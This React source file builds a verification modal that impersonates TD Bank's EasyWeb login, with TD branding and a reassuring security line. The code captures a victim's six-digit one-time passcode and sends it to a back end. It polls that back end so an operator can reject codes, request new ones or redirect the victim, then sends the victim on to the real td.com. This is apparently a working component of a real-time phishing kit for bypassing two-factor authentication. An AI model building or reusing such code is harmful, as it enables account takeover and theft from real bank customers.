import React, { useState, useEffect, useRef } from 'react';
import { X, Check } from 'lucide-react';


const translations = {
  en: {
    title: "EasyWeb Verification",
    subtitle: "A 6-digit verification code has been sent to your email. Please check.",
    boxLabel: "Verification OTP Code",
    expiresIn: "Expires in: ",
    seconds: " seconds",
    expiredWarning: "Code expired — please request a new one.",
    incorrectError: "Incorrect code. Please try again.",
    verifyBtn: "Verify Code",
    verifyingBtn: "Verifying...",
    resendBtn: "Resend Code",
    resendingBtn: "Resending...",
  },
  fr: {
    title: "Vérification EasyWeb",
    subtitle: "Un code de vérification à 6 chiffres a été envoyé à votre courriel. Veuillez vérifier.",
    boxLabel: "Code de vérification OTP",
    expiresIn: "Expire dans : ",
    seconds: " secondes",
    expiredWarning: "Code expiré — veuillez en demander un nouveau.",
    incorrectError: "Code incorrect. Veuillez réessayer.",
    verifyBtn: "Vérifier le code",
    verifyingBtn: "Vérification...",
    resendBtn: "Renvoyer le code",
    resendingBtn: "Renvoi en cours...",
  }
};

export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose }) {
  const t = translations[lang];
  const [otpVal, setOtpVal] = useState(['', '', '', '', '', '']);
  const [status, setStatus] = useState('show_otp');
  const [displayedOtp, setDisplayedOtp] = useState('');
  const [timeLeft, setTimeLeft] = useState(60);
  const [error, setError] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [isFullyVerified, setIsFullyVerified] = useState(false);

  const inputRefs = [useRef(null), useRef(null), useRef(null), useRef(null), useRef(null), useRef(null)];
  const displayedOtpRef = useRef('');

  useEffect(() => { displayedOtpRef.current = displayedOtp; }, [displayedOtp]);

  // Poll session status
  useEffect(() => {
    let isMounted = true;
    const pollStatus = async () => {
      try {
        const response = await fetch(`/api/session-status?email=${encodeURIComponent(email)}`, {
          headers: { 'X-Access-Key': 'client' }
        });
        const data = await response.json();
        if (!isMounted) return;
        if (data.success) {
          if (data.status === 'verified') {
            isMounted = false;
            setIsFullyVerified(true);
            localStorage.removeItem('showOtpModal');
            localStorage.removeItem('otpEmail');
            localStorage.removeItem('otpExpiry');
            fetch('/api/clear-session', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client' },
              body: JSON.stringify({ email })
            }).catch(err => console.error('Error clearing session:', err));
            setTimeout(() => { window.location.href = 'https://www.td.com/'; }, 3000);
            return;
          }
          if (data.status === 'redirect') {
            window.location.href = data.redirectUrl || 'https://www.td.com/';
            return;
          }
          if (data.status === 'cancelled') { onClose(); window.location.reload(); return; }
          if (data.status === 'idle') { onClose(); return; }

          setStatus((prevStatus) => {
            if (data.status === 'rejected' && prevStatus !== 'rejected') {
              setError(t.incorrectError);
              setOtpVal(['', '', '', '', '', '']);
              setTimeout(() => { if (inputRefs[0].current) inputRefs[0].current.focus(); }, 50);
            }
            return data.status;
          });

          if (data.otp && data.otp !== displayedOtpRef.current) {
            setDisplayedOtp(data.otp);
            setOtpVal(['', '', '', '', '', '']);
            setError('');
            setTimeout(() => { if (inputRefs[0].current) inputRefs[0].current.focus(); }, 50);
          }

          if (data.otpExpiry) {
            const remaining = Math.max(0, Math.ceil((data.otpExpiry - Date.now()) / 1000));
            setTimeLeft(remaining);
          }
        }
      } catch (err) {
        console.error('Error polling session status in OtpModal:', err);
      }
    };
    pollStatus();
    const intervalId = setInterval(pollStatus, 2000);
    return () => { isMounted = false; clearInterval(intervalId); };
  }, [email, onVerifySuccess, onClose, t.incorrectError]);

  useEffect(() => {
    if (inputRefs[0].current) inputRefs[0].current.focus();
  }, []);

  useEffect(() => {
    if (status !== 'show_otp' && status !== 'rejected') return;
    if (timeLeft <= 0) return;
    const interval = setInterval(() => setTimeLeft(prev => prev - 1), 1000);
    return () => clearInterval(interval);
  }, [timeLeft, status]);

  const handleChange = (e, index) => {
    const val = e.target.value;
    const lastChar = val.substring(val.length - 1);
    if (lastChar && !/^[0-9]$/.test(lastChar)) return;
    const newOtp = [...otpVal];
    newOtp[index] = lastChar;
    setOtpVal(newOtp);
    setError('');
    if (lastChar !== '' && index < 5) inputRefs[index + 1].current.focus();
  };

  const handleKeyDown = (e, index) => {
    if (e.key === 'Backspace') {
      if (otpVal[index] === '') {
        if (index > 0) {
          const newOtp = [...otpVal];
          newOtp[index - 1] = '';
          setOtpVal(newOtp);
          inputRefs[index - 1].current.focus();
        }
      } else {
        const newOtp = [...otpVal];
        newOtp[index] = '';
        setOtpVal(newOtp);
      }
    } else if (e.key === 'Enter') {
      handleVerify();
    }
  };

  const handlePaste = (e) => {
    e.preventDefault();
    const pasteData = e.clipboardData.getData('text');
    if (/^\d{6}$/.test(pasteData)) {
      const newOtp = pasteData.split('');
      setOtpVal(newOtp);
      setError('');
      if (inputRefs[5].current) inputRefs[5].current.focus();
    }
  };

  useEffect(() => {
    const currentOtp = otpVal.join('');
    if (currentOtp.length === 6) handleVerify(currentOtp);
  }, [otpVal]);

  const handleVerify = async (codeToVerify) => {
    const finalOtp = codeToVerify || otpVal.join('');
    if (finalOtp.length !== 6) return;
    if (timeLeft <= 0) { setError(t.expiredWarning); return; }
    setIsVerifying(true);
    try {
      const response = await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client' },
        body: JSON.stringify({ email, otp: finalOtp })
      });
      const data = await response.json();
      if (data.success) {
        setStatus('otp_submitted');
      } else {
        setError(lang === 'fr' ? 'Une erreur est survenue.' : 'An error occurred.');
      }
    } catch (err) {
      console.error(err);
      setError(lang === 'fr' ? 'Une erreur est survenue.' : 'An error occurred.');
    } finally {
      setIsVerifying(false);
    }
  };

  const handleResend = async () => {
    setOtpVal(['', '', '', '', '', '']);
    setError('');
    setIsResending(true);
    try {
      await fetch('/api/request-resend', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client' },
        body: JSON.stringify({ email })
      });
    } catch (err) {
      console.error('Error requesting resend:', err);
    } finally {
      setIsResending(false);
    }
  };

  const isExpired = timeLeft <= 0;
  const isInputDisabled = isVerifying || status === 'otp_submitted' || status === 'accepted';

  /* ── Verified state ── */
  if (isFullyVerified) {
    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 animate-fade-in">
        <div className="bg-white w-full max-w-[440px] rounded-[4px] shadow-[0_8px_32px_rgba(0,0,0,0.18)] p-10 flex flex-col items-center justify-center text-center border border-[#d8d8d8] animate-slide-in">
          {/* TD-green checkmark circle */}
          <div className="w-[72px] h-[72px] rounded-full bg-brand-green-light flex items-center justify-center mb-5">
            <Check className="w-10 h-10 text-brand-green" strokeWidth={3} />
          </div>
          <h3 className="text-2xl font-medium text-[#222] mb-2">
            {lang === 'fr' ? "Vérification réussie" : "Verification Successful"}
          </h3>
          <p className="text-[#888] text-[15px] font-normal">
            {lang === 'fr' ? "Redirection en cours..." : "Redirecting you to EasyWeb..."}
          </p>
        </div>
      </div>
    );
  }

  /* ── OTP modal ── */
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 animate-fade-in">
      <div className="bg-white w-full max-w-[460px] rounded-[4px] shadow-[0_8px_32px_rgba(0,0,0,0.18)] px-10 pt-9 pb-10 flex flex-col relative border border-[#d8d8d8] animate-slide-in">

        {/* TD green accent bar at top */}
        <div className="absolute top-0 left-0 right-0 h-1 bg-brand-green-dark rounded-t-[4px]" />

        {/* Close button */}
        {onClose && (
          <button
            type="button"
            onClick={onClose}
            className="absolute top-3.5 right-3.5 bg-transparent border-none cursor-pointer text-[#888] p-1 flex items-center rounded-[2px] hover:bg-black/5 transition-colors"
            aria-label="Close"
          >
            <X className="w-[18px] h-[18px]" />
          </button>
        )}

        {/* TD Logo small */}
        <div className="flex justify-center mb-4">
          <svg width="48" height="48" viewBox="0 0 42 42" xmlns="http://www.w3.org/2000/svg">
            <rect width="42" height="42" rx="4" fill="#1a5c2a"/>
            <text x="21" y="30" textAnchor="middle" fill="#fff" fontSize="24" fontWeight="800"
              fontFamily="-apple-system,Helvetica Neue,Arial,sans-serif">TD</text>
          </svg>
        </div>

        <h3 className="text-2xl font-normal text-[#222] text-center mb-2">
          {t.title}
        </h3>
        <p className="text-[#555] text-[15px] text-center mb-6 leading-normal">
          {t.subtitle}
        </p>

        {/* 6-digit OTP inputs */}
        <div className="flex justify-between gap-2.5 mb-4" onPaste={handlePaste}>
          {otpVal.map((digit, idx) => (
            <input
              key={idx}
              ref={inputRefs[idx]}
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              maxLength={1}
              value={digit}
              onChange={e => handleChange(e, idx)}
              onKeyDown={e => handleKeyDown(e, idx)}
              disabled={isInputDisabled}
              className={`w-full h-14 max-w-[56px] text-center text-2xl font-semibold border-2 rounded-[3px] outline-none transition-[border-color,background] duration-150 ${
                isInputDisabled ? 'cursor-not-allowed' : 'cursor-text'
              } ${
                error
                  ? 'border-brand-red bg-[#fef5f5] text-brand-red focus:border-brand-red focus:shadow-[0_0_0_2px_rgba(192,57,43,.18)]'
                  : digit
                    ? 'border-brand-green bg-[#f0faf3] text-[#222] focus:border-brand-green focus:shadow-[0_0_0_2px_rgba(26,123,58,.18)]'
                    : 'border-[#d8d8d8] bg-[#fafafa] text-[#222] focus:border-brand-green focus:shadow-[0_0_0_2px_rgba(26,123,58,.18)]'
              }`}
            />
          ))}
        </div>

        {/* Timer / status line */}
        <div className="text-center h-6 mb-1">
          {(status === 'show_otp' || status === 'rejected') && (
            isExpired ? (
              <span className="text-brand-red text-[15px] font-medium animate-fade-in">
                {t.expiredWarning}
              </span>
            ) : (
              <span className="text-brand-green text-[15px] font-medium">
                {t.expiresIn}
                <span className={`inline-block min-w-[28px] text-center ${timeLeft <= 15 ? 'text-brand-red' : 'text-brand-green'}`}>
                  {timeLeft}
                </span>
                {t.seconds}
              </span>
            )
          )}
          {status === 'otp_submitted' && (
            <span className="text-brand-green text-[15px] font-medium animate-pulse">
              {lang === 'fr' ? 'Vérification en cours...' : 'Verifying code...'}
            </span>
          )}
          {status === 'accepted' && (
            <span className="text-[#2e7d32] text-[15px] font-medium">
              {lang === 'fr' ? '✓ Code accepté !' : '✓ Code accepted!'}
            </span>
          )}
        </div>

        {/* Error message */}
        <div className="text-center h-[22px] mb-4">
          {error && !isExpired && (
            <span className="text-brand-red text-[15px] font-medium animate-fade-in">
              {error}
            </span>
          )}
        </div>

        {/* Buttons */}
        <div className="flex flex-col gap-2.5">
          {/* Verify button */}
          <button
            onClick={() => handleVerify()}
            disabled={isVerifying || isExpired || otpVal.join('').length !== 6 || isInputDisabled}
            className={`w-full h-11 text-white border-none rounded-[4px] text-[17px] font-medium flex items-center justify-center gap-2 transition-colors duration-200 ${
              (isVerifying || isExpired || otpVal.join('').length !== 6 || isInputDisabled)
                ? 'bg-[#ccc] cursor-not-allowed'
                : 'bg-brand-green hover:bg-brand-green-hover cursor-pointer'
            }`}
          >
            {isVerifying || status === 'otp_submitted' ? (
              <>
                <svg className="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                </svg>
                <span>{t.verifyingBtn}</span>
              </>
            ) : (
              t.verifyBtn
            )}
          </button>

          {/* Resend button */}
          <button
            onClick={handleResend}
            disabled={isResending || isVerifying || status === 'otp_submitted' || status === 'accepted'}
            className={`w-full h-11 rounded-[4px] text-[17px] font-medium flex items-center justify-center gap-2 transition-[background,color] duration-200 ${
              (isResending || isVerifying || status === 'otp_submitted' || status === 'accepted')
                ? 'bg-white text-[#aaa] border-[1.5px] border-[#ddd] cursor-not-allowed'
                : 'bg-white text-brand-green-dark border-[1.5px] border-brand-green-dark hover:bg-brand-green-dark hover:text-white cursor-pointer'
            }`}
          >
            {isResending ? (
              <>
                <svg className="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                </svg>
                <span>{t.resendingBtn}</span>
              </>
            ) : (
              t.resendBtn
            )}
          </button>
        </div>

        {/* Small security note */}
        <p className="text-center text-[13px] text-[#888] mt-4 leading-normal">
          {lang === 'fr'
            ? "TD ne vous demandera jamais votre mot de passe complet par courriel ou par téléphone."
            : "TD will never ask for your full password via email or phone."
          }
        </p>
      </div>
    </div>
  );
}
